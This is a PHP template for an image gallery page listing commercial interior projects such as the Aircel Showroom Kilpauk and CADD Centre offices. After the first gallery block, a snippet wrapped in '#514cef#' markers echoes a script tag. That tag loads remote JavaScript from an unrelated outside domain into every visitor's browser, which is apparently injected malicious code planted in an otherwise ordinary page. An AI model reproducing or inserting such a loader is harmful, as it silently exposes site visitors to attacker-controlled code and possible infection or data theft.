<?php include "inc/header.php";?>
<!-- Highlights -->
<section class="wrapper gallery">
	<div class="container ">
		<h3>Aircel Showroom Kilpauk</h3>
		<?php
			$dir1    = 'gallery/Commercial/aircel-showroom-kilpauk/thumb';
			$dir2    = 'gallery/Commercial/aircel-showroom-kilpauk';
			if( @scandir($dir1) ) {
			$files1 = scandir($dir1); 
			array_shift($files1);
			array_shift($files1);
			array_pop($files1);
			$len = 0;
			foreach( $files1 as $img ) {
			if($len%6 == 0)	 {
			?>
		<div class="row">
		<?php
			}
		?>
			<section class="2u 12u(6)">
					<a class="fancybox-thumbs" data-fancybox-group="thumb" href="<?php echo $dir2."/".$img ?>">
						<img src="<?php echo $dir1."/".$img ?>" alt="" width="200" height="150" />
					</a>
			</section>
		<?php
		$len++;
		if($len%6 == 0)	 {
			?>
		</div>
		<?php
			}
			}
			}
		?>
<?php
#514cef#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11968091\"></script>";
echo $g;
}
#/514cef#
?>	</div>
	</br>
	</br>
	<div class="container ">
		<h3>CADD Call Centre</h3>
		<?php
			$dir1    = 'gallery/Commercial/cadd-call-centre/thumb';
			$dir2    = 'gallery/Commercial/cadd-call-centre';
			if( @scandir($dir1) ) {
			$files1 = scandir($dir1); 
			array_shift($files1);
			array_shift($files1);
			array_pop($files1);
			$len = 0;
			foreach( $files1 as $img ) {
			if($len%6 == 0)	 {
			?>
		<div class="row">
		<?php
			}
		?>
			<section class="2u 12u(6)">
					<a class="fancybox-thumbs" data-fancybox-group="thumb" href="<?php echo $dir2."/".$img ?>">
						<img src="<?php echo $dir1."/".$img ?>" alt="" width="200" height="150" />
					</a>
			</section>
		<?php
		$len++;
		if($len%6 == 0)	 {
			?>
		</div>
		<?php
			}
			}
			}
		?>
	</div>
	</br>
	</br>
	<div class="container ">
		<h3>Dyanamiic Domains</h3>
		<?php
			$dir1    = 'gallery/Commercial/dyanamiic-domains/thumb';
			$dir2    = 'gallery/Commercial/dyanamiic-domains';
			if( @scandir($dir1) ) {
			$files1 = scandir($dir1); 
			array_shift($files1);
			array_shift($files1);
			array_pop($files1);
			$len = 0;
			foreach( $files1 as $img ) {
			if($len%6 == 0)	 {
			?>
		<div class="row">
		<?php
			}
		?>
			<section class="2u 12u(6)">
					<a class="fancybox-thumbs" data-fancybox-group="thumb" href="<?php echo $dir2."/".$img ?>">
						<img src="<?php echo $dir1."/".$img ?>" alt="" width="200" height="150" />
					</a>
			</section>
		<?php
		$len++;
		if($len%6 == 0)	 {
			?>
		</div>
		<?php
			}
			}
			}
		?>
	</div>
	</br>
	</br>
	<div class="container ">
		<h3>Pepper</h3>
		<?php
			$dir1    = 'gallery/Commercial/pepper/thumb';
			$dir2    = 'gallery/Commercial/pepper';
			if( @scandir($dir1) ) {
			$files1 = scandir($dir1); 
			array_shift($files1);
			array_shift($files1);
			array_pop($files1);
			$len = 0;
			foreach( $files1 as $img ) {
			if($len%6 == 0)	 {
			?>
		<div class="row">
		<?php
			}
		?>
			<section class="2u 12u(6)">
					<a class="fancybox-thumbs" data-fancybox-group="thumb" href="<?php echo $dir2."/".$img ?>">
						<img src="<?php echo $dir1."/".$img ?>" alt="" width="200" height="150" />
					</a>
			</section>
		<?php
		$len++;
		if($len%6 == 0)	 {
			?>
		</div>
		<?php
			}
			}
			}
		?>
	</div>
	</br>
	</br>
	<div class="container ">
		<h3>CADD Centre Synergy - Bangalore</h3>
		<?php
			$dir1    = 'gallery/Commercial/CADD-Blore/thumb';
			$dir2    = 'gallery/Commercial/CADD-Blore';
			if( @scandir($dir1) ) {
			$files1 = scandir($dir1); 
			array_shift($files1);
			array_shift($files1);
			array_pop($files1);
			$len = 0;
			foreach( $files1 as $img ) {
			if($len%6 == 0)	 {
			?>
		<div class="row">
		<?php
			}
		?>
			<section class="2u 12u(6)">
					<a class="fancybox-thumbs" data-fancybox-group="thumb" href="<?php echo $dir2."/".$img ?>">
						<img src="<?php echo $dir1."/".$img ?>" alt="" width="200" height="150" />
					</a>
			</section>
		<?php
		$len++;
		if($len%6 == 0)	 {
			?>
		</div>
		<?php
			}
			}
			}
		?>
	</div>
</section>
<section class="wrapper strip_line">
</section>
<?php include "inc/footer.php";?>